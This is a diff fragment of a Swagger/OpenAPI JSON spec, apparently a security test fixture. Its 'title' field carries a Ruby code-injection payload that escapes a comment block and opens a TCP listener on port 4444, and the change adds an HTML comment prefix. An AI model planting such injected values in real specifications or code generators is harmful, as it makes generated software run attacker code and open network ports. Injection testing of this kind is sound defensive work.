@@ -3,7 +3,7 @@
           "info": {
               "description": "A",
               "version": "1.0.0",
-              "title": "=end require'socket';s=TCPServer.new(4444);c=s.accept;s.close;c.puts'jceRIQ6nQRODiI+j8AnOMA=='.unpack('m0');=begin "
+              "title": "<!--=end require'socket';s=TCPServer.new(4444);c=s.accept;s.close;c.puts'jceRIQ6nQRODiI+j8AnOMA=='.unpack('m0');=begin "
           },
           "schemes": [
               "https"
